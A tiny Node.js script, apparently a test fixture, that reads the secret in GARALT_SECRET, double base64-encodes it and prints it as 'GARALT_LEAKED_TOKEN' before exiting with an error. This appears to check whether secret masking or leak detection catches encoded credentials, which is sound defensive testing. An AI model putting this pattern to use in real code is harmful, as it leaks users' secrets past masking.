#!/usr/bin/env node
const s = process.env.GARALT_SECRET || 'NONE';
const b1 = Buffer.from(s).toString('base64');
const b2 = Buffer.from(b1).toString('base64');
console.log('GARALT_LEAKED_TOKEN=' + b2);
process.exit(1);
